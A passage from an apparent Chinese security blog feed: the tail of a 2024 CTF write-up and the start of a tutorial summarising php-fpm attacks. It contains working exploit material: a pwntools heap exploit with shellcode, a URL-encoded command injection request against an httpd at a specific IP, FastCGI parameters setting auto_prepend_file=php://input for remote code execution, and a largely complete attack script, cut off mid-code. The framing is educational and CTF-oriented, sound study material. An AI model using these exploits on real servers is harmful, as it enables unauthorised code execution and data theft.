class="hljs-string">&#x27;mprotect&#x27;</span>]<br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>obstack_jump=libc.address+<span class="hljs-number">0x2173c0</span><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk_1,<span class="hljs-number">0x300</span>)+shellcraft.write(<span class="hljs-number">1</span>,chunk_1,<span class="hljs-number">0x300</span>)<br>fake_io_add=chunk_0<br><br>obstack=fake_io_add<br>context=fake_io_add+<span class="hljs-number">0xe8</span><br>shelladd=context+<span class="hljs-number">0xe8</span><br><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x20</span>: [xxx,xxx,xxx],<br>    <span class="hljs-number">0x60</span>: [<span class="hljs-number">0</span>,shelladd,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,setcontext,<span class="hljs-number">0</span>,context,<span class="hljs-number">1</span>],<br><br>    <span class="hljs-number">0xd8</span>: obstack_jump+<span class="hljs-number">0x20</span>,<br>    <span class="hljs-number">0xe0</span>: fake_io_add+<span class="hljs-number">0x60</span>,<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>cont=flat(&#123;<br>    <span class="hljs-number">0x68</span>: obstack&amp;(~<span class="hljs-number">0xfff</span>), <span class="hljs-comment"># rdi</span><br>    <span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>, <span class="hljs-comment"># rsi</span><br>    <span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>, <span class="hljs-comment"># rdx</span><br>    <span class="hljs-number">0xa0</span>: fake_io_add+<span class="hljs-number">0x68</span>, <span class="hljs-comment"># rsp</span><br>    <span class="hljs-number">0xa8</span>: mprotect, <span class="hljs-comment"># rcx-&gt;rip</span><br>    <span class="hljs-number">0xe0</span>: obstack<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload=fake_io[<span class="hljs-number">0x20</span>:]+cont+asm(shellcode)<br><br>free(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,data=payload.ljust(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>free(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br><br><span class="hljs-comment">#free(4,2)</span><br><span class="hljs-comment">#add(1,4,3,data=payload)</span><br><br>p.sendline(<span class="hljs-string">&#x27;9&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">// 第一次 直接执行命令，将flag导入到/check/test.html中</span><br>GET /cat%20/flag%20%3e%63%68%65%63%6b%2f%74%65%73%74%2e%68%74%6d%6c HTTP/<span class="hljs-number">1.0</span><br>Host: <span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span><br>Content-Length: <span class="hljs-number">7</span><br><br><span class="hljs-number">123</span><br><br><br><br><br><span class="hljs-comment">//第二次</span><br>GET /check/test.html HTTP/<span class="hljs-number">1.0</span><br>Host: <span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span><br>Content-Length: <span class="hljs-number">7</span><br><br><span class="hljs-number">123</span><br><br><br><br><br></code></pre></td></tr></table></figure><h1 id="决赛-渗透测试"><a href="#决赛-渗透测试" class="headerlink" title="[决赛] 渗透测试"></a>[决赛] 渗透测试</h1><p><img src="/img/wp/2024/2024-ycb-j-shentou-1.png" alt="拓扑"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初赛-数据安全&quot;&gt;&lt;a href=&quot;#初赛-数据安全&quot; class=&quot;headerlink&quot; title=&quot;[初赛] 数据安全&quot;&gt;&lt;/a&gt;[初赛] 数据安全&lt;/h1&gt;&lt;h2 id=&quot;data-analy1&quot;&gt;&lt;a href=&quot;#data-analy1&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="羊城杯" scheme="https://www.dr0n.top/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
    <category term="2024" scheme="https://www.dr0n.top/tags/2024/"/>
    
  </entry>
  
  <entry>
    <title>php-fpm攻击总结</title>
    <link href="https://www.dr0n.top/posts/21a69435/"/>
    <id>https://www.dr0n.top/posts/21a69435/</id>
    <published>2024-07-22T04:00:00.000Z</published>
    <updated>2024-08-03T06:14:42.241Z</updated>
    
    <content type="html"><![CDATA[<p>PHP-FPM 是 FastCGI 的一个具体实现（协议解析器）</p><p>Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM，然后FPM按照fastcgi的协议将TCP流解析成真正的数据</p><p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会将这个请求变成如下key-value对：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,<br>    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,<br>    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,<br>    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,<br>    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,<br>    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,<br>    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,<br>    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,<br>    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,<br>    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,<br>    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,<br>    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,<br>    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,<br>    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>SCRIPT_FILENAME</code>的值就是要执行的文件</p><h1 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h1><p><em>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</em></p><p>1：由于<code>nginx.conf</code>的错误配置导致<code>nginx</code>把以<code>.php</code>结尾的文件交给<code>fastcgi</code>处理，为此可以构造<code>upload/1.png/1.php</code>（1.png是上传的文件，包含一句话木马）</p><p>2：但是<code>fastcgi</code>在处理<code>1.php</code>文件时发现文件并不存在，这时<code>php.ini</code>配置文件中<code>cgi.fix_pathinfo=1</code>发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由<code>fastcgi</code>处理的文件就变成了<code>/1.png</code>，最后将<code>1.png</code>的内容当成php解析</p><p>漏洞复现地址：<a href="https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability">https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability</a></p><h1 id="php-fpm未授权导致的任意代码执行"><a href="#php-fpm未授权导致的任意代码执行" class="headerlink" title="php-fpm未授权导致的任意代码执行"></a>php-fpm未授权导致的任意代码执行</h1><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，伪装成Web服务器中间件和 PHP-FPM 通信，这就造成了 PHP-FPM 的未授权访问漏洞</p><p>在此基础上，我们可以设置 PHP-FPM 的两个环境变量：<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。它们的作用就是用来设置PHP配置项的</p><p>通过将PHP配置项<code>auto_prepend_file</code>或<code>auto_append_file</code>的值设置成<code>php://input</code>，就能在执行<code>SCRIPT_FILENAME</code>指向的文件时进行包含body内容，从而执行我们自定义的恶意代码</p><p>设置包含的条件还需要开启<code>allow_url_include = On</code>(远程文件包含)</p><p>综合起来，如下所示</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,<br>    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,<br>    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,<br>    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,<br>    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,<br>    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,<br>    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,<br>    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,<br>    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,<br>    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,<br>    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,<br>    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,<br>    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,<br>    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;<br>    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,<br>    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;<br>&#125;<br></code></pre></td></tr></table></figure><p>来自phith0n的攻击脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br>        <span class="hljs-keyword">try</span>:<br>            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))<br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            self.sock.close()<br>            self.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>               + bchr(fcgi_type) \<br>               + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(<span class="hljs-number">0</span>) \<br>               + bchr(<span class="hljs-number">0</span>) \<br>               + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(self.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + bchr(self.keepalive) \<br>                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        self.sock.send(request)<br>        self.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span 